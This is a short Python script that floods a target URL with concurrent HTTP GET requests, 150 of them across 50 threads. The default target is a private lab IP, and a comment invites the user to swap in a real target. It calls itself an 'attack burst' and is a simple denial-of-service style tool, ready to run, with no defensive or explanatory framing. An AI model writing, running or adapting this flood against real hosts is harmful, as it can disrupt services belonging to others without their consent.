import requests
import time
from concurrent.futures import ThreadPoolExecutor

target_url = "http://192.168.56.101/"  # Replace with your actual target IP
total_requests = 150

def send_request(n):
    try:
        r = requests.get(target_url)
        print(f"[{n}] Status Code: {r.status_code}")
    except Exception as e:
        print(f"[{n}] Request failed: {e}")

if __name__ == "__main__":
    with ThreadPoolExecutor(max_workers=50) as executor:
        for i in range(total_requests):
            executor.submit(send_request, i)
    print("Attack burst complete.")